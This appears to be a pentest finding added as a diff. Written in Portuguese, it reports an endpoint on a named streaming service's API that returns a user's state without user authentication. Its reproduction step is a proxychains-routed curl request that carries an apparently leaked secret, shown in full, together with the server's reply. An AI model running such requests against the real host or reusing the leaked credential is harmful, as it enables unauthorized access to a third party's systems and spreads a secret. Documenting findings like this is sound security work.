@@ -1,0 +1,24 @@
+# F-016 GetUserUF — Exposição de Dados sem Autenticação
+
+Alvo: netmovies-service.ottvs.com.br (API /v1/android/GetUserUF)
+Severidade: MÉDIA
+Timestamp: 2026-08-20T04:10:00Z
+
+## Reprodução
+```
+$ proxychains4 curl -s -X POST https://netmovies-service.ottvs.com.br/v1/android/GetUserUF \
+  -H "Content-Type: application/json" \
+  -d '{"AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}'
+
+{"GetUserUFResult":{"UF":"SP","Result":0}}
+```
+
+## Interpretação
+O endpoint GetUserUF retorna um estado (UF) sem qualquer autenticação de usuário. Apenas o secret vazado é necessário. Retornou "SP" (São Paulo), sugerindo que o backend infere a localização do IP do request ou retorna um valor default.
+
+## Impacto
+- **Leve exposure de geolocalização** — IP mapping
+- **Não requer autenticação** — apenas secret vazado
+
+## Recomendação
+- Baixa prioridade. Revisar se endpoint deve ser público.
